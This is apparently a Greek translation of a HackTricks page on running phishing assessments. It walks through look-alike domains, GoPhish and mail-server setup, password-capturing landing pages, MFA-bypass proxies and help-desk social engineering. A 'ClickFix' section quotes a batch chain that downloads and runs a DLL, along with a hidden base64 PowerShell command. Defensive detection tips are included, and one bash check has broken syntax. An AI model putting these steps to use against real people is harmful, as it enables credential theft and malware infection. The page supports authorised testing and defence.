# Phishing Methodology

{{#include ../../banners/hacktricks-training.md}}

## Μεθοδολογία

1. Recon το θύμα
1. Επιλέξτε το **victim domain**.
2. Κάντε βασική web enumeration **αναζητώντας login portals** που χρησιμοποιεί το θύμα και **αποφασίστε** ποιο θα **impersonate**.
3. Χρησιμοποιήστε κάποιο **OSINT** για να **βρείτε emails**.
2. Προετοιμάστε το περιβάλλον
1. **Αγοράστε το domain** που θα χρησιμοποιήσετε για το phishing assessment
2. **Ρυθμίστε τα records** της email service που σχετίζονται (SPF, DMARC, DKIM, rDNS)
3. Ρυθμίστε το VPS με **gophish**
3. Προετοιμάστε το campaign
1. Προετοιμάστε το **email template**
2. Προετοιμάστε την **web page** για να κλέψετε τα credentials
4. Ξεκινήστε το campaign!

## Δημιουργήστε παρόμοια domain names ή αγοράστε ένα trusted domain

### Domain Name Variation Techniques

- **Keyword**: Το domain name **περιέχει** ένα σημαντικό **keyword** του αρχικού domain (π.χ., zelster.com-management.com).
- **hypened subdomain**: Αλλάζει την **τελεία σε παύλα** ενός subdomain (π.χ., www-zelster.com).
- **New TLD**: Το ίδιο domain χρησιμοποιώντας ένα **new TLD** (π.χ., zelster.org)
- **Homoglyph**: **Αντικαθιστά** ένα γράμμα στο domain name με **γράμματα που μοιάζουν** (π.χ., zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** **Ανταλλάσσει δύο γράμματα** μέσα στο domain name (π.χ., zelsetr.com).
- **Singularization/Pluralization**: Προσθέτει ή αφαιρεί “s” στο τέλος του domain name (π.χ., zeltsers.com).
- **Omission**: **Αφαιρεί ένα** από τα γράμματα του domain name (π.χ., zelser.com).
- **Repetition:** **Επαναλαμβάνει ένα** από τα γράμματα στο domain name (π.χ., zeltsser.com).
- **Replacement**: Όπως το homoglyph αλλά λιγότερο stealthy. Αντικαθιστά ένα από τα γράμματα στο domain name, ίσως με ένα γράμμα σε εγγύτητα του αρχικού γράμματος στο keyboard (π.χ, zektser.com).
- **Subdomained**: Εισάγει μια **τελεία** μέσα στο domain name (π.χ., ze.lster.com).
- **Insertion**: **Εισάγει ένα γράμμα** στο domain name (π.χ., zerltser.com).
- **Missing dot**: Προσθέτει το TLD στο domain name. (π.χ., zelstercom.com)

**Automatic Tools**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Websites**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Υπάρχει μια **πιθανότητα ένα από κάποια bits που αποθηκεύονται ή μεταδίδονται να αντιστραφεί αυτόματα** λόγω διαφόρων παραγόντων όπως solar flares, cosmic rays ή hardware errors.

Όταν αυτή η έννοια **εφαρμόζεται σε DNS requests**, είναι πιθανό το **domain που λαμβάνει ο DNS server** να μην είναι το ίδιο με το domain που ζητήθηκε αρχικά.

Για παράδειγμα, μια απλή τροποποίηση bit στο domain "windows.com" μπορεί να το αλλάξει σε "windnws.com."

Οι attackers μπορεί να **εκμεταλλευτούν αυτό καταχωρώντας πολλαπλά bit-flipping domains** που είναι παρόμοια με το domain του θύματος. Η πρόθεσή τους είναι να ανακατευθύνουν νόμιμους users στη δική τους infrastructure.

Για περισσότερες πληροφορίες διαβάστε [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)

### Αγοράστε ένα trusted domain

Μπορείτε να αναζητήσετε στο [https://www.expireddomains.net/](https://www.expireddomains.net) για ένα expired domain που θα μπορούσατε να χρησιμοποιήσετε.\
Για να βεβαιωθείτε ότι το expired domain που πρόκειται να αγοράσετε **έχει ήδη καλό SEO** μπορείτε να δείτε πώς κατηγοριοποιείται σε:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Εύρεση Emails

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% free)
- [https://phonebook.cz/](https://phonebook.cz) (100% free)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Για να **βρείτε περισσότερες** valid email addresses ή να **επαληθεύσετε αυτές** που έχετε ήδη βρει, μπορείτε να ελέγξετε αν μπορείτε να κάνετε brute-force στα smtp servers του θύματος. [Μάθετε πώς να επαληθεύετε/εντοπίζετε email addresses εδώ](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Επιπλέον, μην ξεχνάτε ότι αν οι users χρησιμοποιούν **οποιοδήποτε web portal για να έχουν πρόσβαση στα mails τους**, μπορείτε να ελέγξετε αν είναι vulnerable σε **username brute force**, και να εκμεταλλευτείτε το vulnerability αν είναι δυνατόν.

## Ρύθμιση του GoPhish

### Εγκατάσταση

Μπορείτε να το κατεβάσετε από [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Κατεβάστε το και αποσυμπιέστε το μέσα στο `/opt/gophish` και εκτελέστε `/opt/gophish/gophish`\
Θα σας δοθεί ένας κωδικός για τον admin user στη θύρα 3333 στο output. Επομένως, αποκτήστε πρόσβαση σε αυτή τη θύρα και χρησιμοποιήστε αυτά τα credentials για να αλλάξετε τον admin password. Μπορεί να χρειαστεί να κάνετε tunnel αυτή τη θύρα στο local:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### Ρύθμιση

**Ρύθμιση TLS certificate**

Πριν από αυτό το βήμα θα πρέπει να έχετε **ήδη αγοράσει το domain** που θα χρησιμοποιήσετε και πρέπει να **δείχνει** στο **IP του VPS** όπου ρυθμίζετε το **gophish**.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Ρύθμιση Mail**

Ξεκινήστε την εγκατάσταση: `apt-get install postfix`

Έπειτα προσθέστε το domain στα ακόλουθα αρχεία:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Αλλάξτε επίσης τις τιμές των ακόλουθων μεταβλητών μέσα στο /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Τέλος τροποποιήστε τα αρχεία **`/etc/hostname`** και **`/etc/mailname`** με το domain name σας και **επανεκκινήστε το VPS σας.**

Τώρα, δημιουργήστε μια εγγραφή **DNS A** του `mail.<domain>` που να δείχνει στη **διεύθυνση IP** του VPS και μια εγγραφή **DNS MX** που να δείχνει στο `mail.<domain>`

Τώρα ας δοκιμάσουμε να στείλουμε ένα email:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Διαμόρφωση Gophish**

Σταματήστε την εκτέλεση του gophish και ας το ρυθμίσουμε.\
Τροποποιήστε το `/opt/gophish/config.json` ως εξής (σημειώστε τη χρήση του https):
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**Ρύθμιση του gophish service**

Για να δημιουργήσετε το gophish service ώστε να μπορεί να ξεκινά αυτόματα και να διαχειρίζεται ως service, μπορείτε να δημιουργήσετε το αρχείο `/etc/init.d/gophish` με το ακόλουθο περιεχόμενο:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
Ολοκληρώστε τη διαμόρφωση του service και ελέγξτε το κάνοντας:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## Ρύθμιση mail server και domain

### Περίμενε & να είσαι νόμιμος

Όσο πιο παλιό είναι ένα domain, τόσο λιγότερο πιθανό είναι να χαρακτηριστεί ως spam. Άρα θα πρέπει να περιμένεις όσο περισσότερο χρόνο γίνεται (τουλάχιστον 1 εβδομάδα) πριν από το phishing assessment. Επιπλέον, αν βάλεις μια σελίδα για έναν reputational sector, η φήμη που θα αποκτήσεις θα είναι καλύτερη.

Σημείωσε ότι ακόμα κι αν χρειάζεται να περιμένεις μία εβδομάδα, μπορείς να τελειώσεις τώρα με όλη τη ρύθμιση.

### Ρύθμιση εγγραφής Reverse DNS (rDNS)

Ρύθμισε μια rDNS (PTR) εγγραφή που επιλύει τη διεύθυνση IP του VPS στο domain name.

### Εγγραφή Sender Policy Framework (SPF)

Πρέπει να **ρυθμίσεις μια SPF εγγραφή για το νέο domain**. Αν δεν ξέρεις τι είναι μια SPF εγγραφή [**διάβασε αυτή τη σελίδα**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Μπορείς να χρησιμοποιήσεις το [https://www.spfwizard.net/](https://www.spfwizard.net) για να δημιουργήσεις το SPF policy σου (χρησιμοποίησε την IP του VPS machine)

![SPF Wizard form for generating an SPF record for a phishing domain](<../../images/image (1037).png>)

Αυτό είναι το περιεχόμενο που πρέπει να οριστεί μέσα σε μια TXT εγγραφή μέσα στο domain:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Εγγραφή Domain-based Message Authentication, Reporting & Conformance (DMARC)

Πρέπει να **ρυθμίσεις μια εγγραφή DMARC για το νέο domain**. Αν δεν ξέρεις τι είναι μια εγγραφή DMARC, [**διάβασε αυτή τη σελίδα**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Πρέπει να δημιουργήσεις μια νέα DNS TXT εγγραφή που να δείχνει στο hostname `_dmarc.<domain>` με το ακόλουθο περιεχόμενο:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

Πρέπει να **ρυθμίσετε ένα DKIM για τον νέο domain**. Αν δεν ξέρετε τι είναι ένα DMARC record [**διαβάστε αυτή τη σελίδα**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

Αυτό το tutorial βασίζεται στο: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)

> [!TIP]
> Πρέπει να συνενώσετε και τις δύο τιμές B64 που δημιουργεί το DKIM key:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Δοκιμάστε τη βαθμολογία της email ρύθμισής σας

Μπορείτε να το κάνετε χρησιμοποιώντας το [https://www.mail-tester.com/](https://www.mail-tester.com)\
Απλώς μπείτε στη σελίδα και στείλτε ένα email στη διεύθυνση που σας δίνουν:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
Μπορείτε επίσης να **ελέγξετε τη διαμόρφωση του email σας** στέλνοντας ένα email στο `check-auth@verifier.port25.com` και **διαβάζοντας την απάντηση** (για αυτό θα χρειαστεί να **ανοίξετε** τη θύρα **25** και να δείτε την απάντηση στο αρχείο _/var/mail/root_ αν στείλετε το email ως root).\
Ελέγξτε ότι περνάτε όλα τα tests:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
Θα μπορούσες επίσης να στείλεις **μήνυμα σε ένα Gmail υπό τον έλεγχό σου**, και να ελέγξεις τις **κεφαλίδες του email** στο inbox του Gmail σου, το `dkim=pass` θα πρέπει να υπάρχει στο πεδίο κεφαλίδας `Authentication-Results`.
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### ​Removing from Spamhouse Blacklist

Η σελίδα [www.mail-tester.com](https://www.mail-tester.com) μπορεί να σου δείξει αν το domain σου μπλοκάρεται από spamhouse. Μπορείς να ζητήσεις την αφαίρεση του domain/IP σου στο: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Removing from Microsoft Blacklist

​​Μπορείς να ζητήσεις την αφαίρεση του domain/IP σου στο [https://sender.office.com/](https://sender.office.com).

## Create & Launch GoPhish Campaign

### Sending Profile

- Όρισε κάποιο **όνομα για να αναγνωρίζεις** το sender profile
- Αποφάσισε από ποιο account θα στέλνεις τα phishing emails. Προτάσεις: _noreply, support, servicedesk, salesforce..._
- Μπορείς να αφήσεις κενά το username και το password, αλλά βεβαιώσου ότι έχεις ενεργοποιήσει το Ignore Certificate Errors

![Create & Launch GoPhish Campaign - Sending Profile: You can leave blank the username and password, but make sure to check the Ignore Certificate Errors](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Συνιστάται να χρησιμοποιήσεις τη λειτουργία "**Send Test Email**" για να ελέγξεις ότι όλα λειτουργούν.\
> Θα πρότεινα να **στείλεις τα test emails σε 10min mail addresses** για να αποφύγεις να καταλήξεις σε blacklist κατά τη διάρκεια των tests.

### Email Template

- Όρισε κάποιο **όνομα για να αναγνωρίζεις** το template
- Έπειτα γράψε ένα **subject** (τίποτα περίεργο, απλώς κάτι που θα περίμενες να διαβάσεις σε ένα κανονικό email)
- Βεβαιώσου ότι έχεις επιλέξει "**Add Tracking Image**"
- Γράψε το **email template** (μπορείς να χρησιμοποιήσεις variables όπως στο ακόλουθο παράδειγμα):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
Σημείωσε ότι **για να αυξήσεις την αξιοπιστία του email**, συνιστάται να χρησιμοποιήσεις κάποια signature από email του client. Προτάσεις:

- Στείλε ένα email σε **ανύπαρκτη διεύθυνση** και έλεγξε αν η απάντηση έχει κάποια signature.
- Αναζήτησε **public emails** όπως info@ex.com ή press@ex.com ή public@ex.com και στείλε τους ένα email και περίμενε την απάντηση.
- Προσπάθησε να επικοινωνήσεις με κάποιο **έγκυρο email που ανακάλυψες** και περίμενε την απάντηση

![Sending Profile - Email Template: Try to contact some valid discovered email and wait for the response](<../../images/image (80).png>)

> [!TIP]
> Το Email Template επιτρέπει επίσης να **επισυνάπτεις αρχεία για αποστολή**. Αν θέλεις επίσης να κλέψεις NTLM challenges χρησιμοποιώντας κάποια ειδικά κατασκευασμένα αρχεία/έγγραφα [διάβασε αυτή τη σελίδα](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landing Page

- Γράψε ένα **name**
- **Γράψε τον HTML code** της web page. Σημείωσε ότι μπορείς να **import** web pages.
- Ενεργοποίησε **Capture Submitted Data** και **Capture Passwords**
- Όρισε ένα **redirection**

![Email Template - Landing Page: Mark Capture Submitted Data and Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> Συνήθως θα χρειαστεί να τροποποιήσεις τον HTML code της σελίδας και να κάνεις κάποια tests τοπικά (ίσως χρησιμοποιώντας κάποιο Apache server) **μέχρι να σου αρέσουν τα αποτελέσματα.** Έπειτα, γράψε εκείνο το HTML code στο πλαίσιο.\
> Σημείωσε ότι αν χρειάζεται να **χρησιμοποιήσεις κάποια static resources** για το HTML (ίσως κάποιες σελίδες CSS και JS) μπορείς να τις αποθηκεύσεις στο _**/opt/gophish/static/endpoint**_ και μετά να τις προσπελάσεις από το _**/static/\<filename>**_

> [!TIP]
> Για το redirection θα μπορούσες να **ανακατευθύνεις τους χρήστες στην legit main web page** του θύματος, ή να τους ανακατευθύνεις στο _/static/migration.html_ για παράδειγμα, να βάλεις κάποιο **spinning wheel (**[**https://loading.io/**](https://loading.io)**) για 5 δευτερόλεπτα και μετά να δείξεις ότι η διαδικασία ήταν επιτυχής**.

### Users & Groups

- Όρισε ένα name
- **Import the data** (σημείωσε ότι για να χρησιμοποιήσεις το template για το example χρειάζεσαι το firstname, last name και email address κάθε user)

![Landing Page - Users & Groups: Import the data (note that in order to use the template for the example you need the firstname, last name and email address of each user)](<../../images/image (163).png>)

### Campaign

Τέλος, δημιούργησε ένα campaign επιλέγοντας ένα name, το email template, το landing page, το URL, το sending profile και το group. Σημείωσε ότι το URL θα είναι το link που θα σταλεί στα θύματα

Σημείωσε ότι το **Sending Profile επιτρέπει να στείλεις ένα test email για να δεις πώς θα φαίνεται το τελικό phishing email**:

![Users & Groups - Campaign: Note that the Sending Profile allow to send a test email to see how will the final phishing email looks like](<../../images/image (192).png>)

> [!TIP]
> Θα πρότεινα να **στείλεις τα test emails σε διευθύνσεις 10min mails** ώστε να αποφύγεις να μπλοκαριστείς στη blacklist κάνοντας tests.

Μόλις όλα είναι έτοιμα, απλώς ξεκίνα το campaign!

## Website Cloning

Αν για οποιονδήποτε λόγο θέλεις να κάνεις clone το website έλεγξε την ακόλουθη σελίδα:


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

Σε ορισμένες phishing assessments (κυρίως για Red Teams) θα θέλεις επίσης να **στείλεις αρχεία που περιέχουν κάποιο είδος backdoor** (ίσως ένα C2 ή ίσως απλώς κάτι που θα ενεργοποιήσει ένα authentication).\
Δες την ακόλουθη σελίδα για κάποια παραδείγματα:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

Η προηγούμενη επίθεση είναι αρκετά έξυπνη καθώς προσποιείσαι ένα πραγματικό website και συλλέγεις τις πληροφορίες που εισάγει ο χρήστης. Δυστυχώς, αν ο χρήστης δεν έβαλε τον σωστό κωδικό ή αν η εφαρμογή που προσποίησες είναι ρυθμισμένη με 2FA, **αυτές οι πληροφορίες δεν θα σου επιτρέψουν να υποδυθείς τον εξαπατημένο χρήστη**.

Εδώ είναι που εργαλεία όπως [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) και [**muraena**](https://github.com/muraenateam/muraena) είναι χρήσιμα. Αυτό το εργαλείο θα σου επιτρέψει να δημιουργήσεις μια MitM-like επίθεση. Βασικά, η επίθεση λειτουργεί με τον εξής τρόπο:

1. **Υποδύεσαι τη login** φόρμα της πραγματικής web page.
2. Ο χρήστης **στέλνει** τα **credentials** του στη fake page σου και το εργαλείο τα στέλνει στην πραγματική web page, **ελέγχοντας αν τα credentials δουλεύουν**.
3. Αν ο λογαριασμός είναι ρυθμισμένος με **2FA**, η MitM page θα το ζητήσει και μόλις ο **user το εισάγει** το εργαλείο θα το στείλει στην πραγματική web page.
4. Μόλις ο χρήστης αυθεντικοποιηθεί εσύ (ως attacker) θα έχεις **καταγράψει τα credentials, το 2FA, το cookie και κάθε πληροφορία** από κάθε αλληλεπίδρασή σου ενώ το εργαλείο εκτελεί ένα MitM.

### Via VNC

Κι αν αντί να **στείλεις το θύμα σε μια κακόβουλη page** με την ίδια εμφάνιση όπως η αρχική, το στείλεις σε ένα **VNC session με έναν browser συνδεδεμένο στην πραγματική web page**; Θα μπορείς να δεις τι κάνει, να κλέψεις τον κωδικό, το MFA που χρησιμοποιεί, τα cookies...\
Μπορείς να το κάνεις αυτό με το [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC)

## Detecting the detection

Προφανώς ένας από τους καλύτερους τρόπους για να καταλάβεις αν σε ανακάλυψαν είναι να **αναζητήσεις το domain σου μέσα σε blacklists**. Αν εμφανίζεται στη λίστα, κάπως το domain σου ανιχνεύτηκε ως ύποπτο.\
Ένας εύκολος τρόπος να ελέγξεις αν το domain σου εμφανίζεται σε οποιαδήποτε blacklist είναι να χρησιμοποιήσεις το [https://malwareworld.com/](https://malwareworld.com)

Ωστόσο, υπάρχουν και άλλοι τρόποι να καταλάβεις αν το θύμα **αναζητά ενεργά ύποπτη phishing activity στο wild** όπως εξηγείται στο:


{{#ref}}
detecting-phising.md
{{#endref}}

Μπορείς να **αγοράσεις ένα domain με πολύ παρόμοιο όνομα** με το domain του θύματος **και/ή να δημιουργήσεις ένα certificate** για ένα **subdomain** ενός domain που ελέγχεις εσύ **το οποίο περιέχει** το **keyword** του domain του θύματος. Αν το **θύμα** κάνει οποιουδήποτε είδους **DNS ή HTTP interaction** με αυτά, θα ξέρεις ότι **το αναζητά ενεργά** για ύποπτα domains και θα χρειαστεί να είσαι πολύ stealth.

### Evaluate the phishing

Χρησιμοποίησε το [**Phishious** ](https://github.com/Rices/Phishious) για να αξιολογήσεις αν το email σου θα καταλήξει στον spam folder ή αν θα μπλοκαριστεί ή θα πετύχει.

## High-Touch Identity Compromise (Help-Desk MFA Reset)

Τα σύγχρονα intrusion sets όλο και πιο συχνά παρακάμπτουν εντελώς τα email lures και **στοχεύουν απευθείας τη ροή εργασίας service-desk / identity-recovery** για να νικήσουν το MFA. Η επίθεση είναι πλήρως "living-off-the-land": μόλις ο operator αποκτήσει valid credentials, προχωρά με ενσωματωμένα admin εργαλεία – δεν απαιτείται malware.

### Attack flow
1. Recon το θύμα
* Συλλέγεις προσωπικά & εταιρικά στοιχεία από LinkedIn, data breaches, public GitHub, κ.λπ.
* Εντοπίζεις high-value identities (executives, IT, finance) και απαριθμείς την **ακριβή help-desk διαδικασία** για password / MFA reset.
2. Real-time social engineering
* Καλείς, στέλνεις Teams ή chat το help-desk ενώ υποδύεσαι τον στόχο (συχνά με **spoofed caller-ID** ή **cloned voice**).
* Παρουσιάζεις τα προηγουμένως συλλεγμένα PII για να περάσεις την knowledge-based verification.
* Πείθεις τον agent να **κάνει reset το MFA secret** ή να πραγματοποιήσει ένα **SIM-swap** σε καταχωρισμένο κινητό αριθμό.
3. Άμεσες ενέργειες μετά την πρόσβαση (≤60 min σε πραγματικά περιστατικά)
* Εδραιώνεις foothold μέσω οποιουδήποτε web SSO portal.
* Απαριθμείς AD / AzureAD με built-ins (δεν πέφτουν binaries):
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* Lateral movement με **WMI**, **PsExec**, ή νόμιμους **RMM** agents που ήδη είναι whitelisted στο περιβάλλον.

### Detection & Mitigation
* Αντιμετώπισε το help-desk identity recovery ως **privileged operation** – απαίτησε step-up auth & έγκριση manager.
* Ανάπτυξε κανόνες **Identity Threat Detection & Response (ITDR)** / **UEBA** που ειδοποιούν για:
* Αλλαγή MFA method + authentication από νέο device / geo.
* Άμεση elevation του ίδιου principal (user-→-admin).
* Κατέγραψε help-desk calls και εφάρμοσε ένα **call-back σε ήδη καταχωρισμένο αριθμό** πριν από οποιοδήποτε reset.
* Εφάρμοσε **Just-In-Time (JIT) / Privileged Access** ώστε οι newly reset λογαριασμοί να **μην** κληρονομούν αυτόματα high-privilege tokens.

---

## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
Commodity crews αντισταθμίζουν το κόστος των high-touch ops με mass attacks που μετατρέπουν τις **search engines & ad networks σε delivery channel**.

1. **SEO poisoning / malvertising** σπρώχνει ένα fake αποτέλεσμα όπως `chromium-update[.]site` στην κορυφή των search ads.
2. Το θύμα κατεβάζει έναν μικρό **first-stage loader** (συχνά JS/HTA/ISO). Παραδείγματα που παρατηρήθηκαν από τη Unit 42:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. Το loader εξfiltrates browser cookies + credential DBs, έπειτα τραβά έναν **silent loader** ο οποίος αποφασίζει – *σε realtime* – αν θα αναπτύξει:
* RAT (π.χ. AsyncRAT, RustDesk)
* ransomware / wiper
* persistence component (registry Run key + scheduled task)

### Hardening tips
* Μπλόκαρε newly-registered domains & εφάρμοσε **Advanced DNS / URL Filtering** στα *search-ads* καθώς και στο e-mail.
* Περιόρισε την εγκατάσταση software σε signed MSI / Store packages, απαγόρευσε την εκτέλεση `HTA`, `ISO`, `VBS` μέσω policy.
* Παρακολούθησε child processes browsers που ανοίγουν installers:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* Κυνήγησε LOLBins που συχνά καταχρώνται από first-stage loaders (π.χ. `regsvr32`, `curl`, `mshta`).

### ClickFix DLL delivery tradecraft (fake CERT update)
* Lure: cloned national CERT advisory με κουμπί **Update** που εμφανίζει βήμα-βήμα οδηγίες “fix”. Στα θύματα λένε να τρέξουν ένα batch που κατεβάζει ένα DLL και το εκτελεί μέσω `rundll32`.
* Τυπική batch chain που παρατηρήθηκε:
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* Το `Invoke-WebRequest` ρίχνει το payload στο `%TEMP%`, ένα μικρό sleep κρύβει το network jitter, και μετά το `rundll32` καλεί το exported entrypoint (`notepad`).
* Το DLL beacons host identity και κάνει poll το C2 κάθε λίγα λεπτά. Το remote tasking έρχεται ως **base64-encoded PowerShell** που εκτελείται hidden και με policy bypass:
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* Αυτό διατηρεί την ευελιξία του C2 (ο server μπορεί να αλλάξει tasks χωρίς να ενημερώσει το DLL) και κρύβει τα console windows. Κυνήγησε children του PowerShell από `rundll32.exe` χρησιμοποιώντας μαζί `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression`.
* Οι defenders μπορούν να ψάξουν για HTTP(S) callbacks της μορφής `...page.php?tynor=<COMPUTER>sss<USER>` και διαστήματα polling 5 λεπτών μετά το DLL load.

---

## AI-Enhanced Phishing Operations
Οι attackers πλέον συνδυάζουν **LLM & voice-clone APIs** για πλήρως εξατομικευμένα lures και real-time interaction.

| Layer | Example use by threat actor |
|-------|-----------------------------|
|Automation|Generate & send >100 k emails / SMS with randomised wording & tracking links.|
|Generative AI|Produce *one-off* emails referencing public M&A, inside jokes from social media; deep-fake CEO voice in callback scam.|
|Agentic AI|Autonomously register domains, scrape open-source intel, craft next-stage mails when a victim clicks but doesn’t submit creds.|

**Defence:**
• Πρόσθεσε **dynamic banners** που επισημαίνουν μηνύματα που στάλθηκαν από untrusted automation (μέσω ARC/DKIM anomalies).
• Εφάρμοσε **voice-biometric challenge phrases** για requests υψηλού ρίσκου μέσω τηλεφώνου.
• Προσομοίωσε συνεχώς AI-generated lures σε awareness programmes – τα static templates είναι ξεπερασμένα.

See also – agentic browsing abuse for credential phishing:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

See also – AI agent abuse of local CLI tools and MCP (for secrets inventory and detection):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-assisted runtime assembly of phishing JavaScript (in-browser codegen)

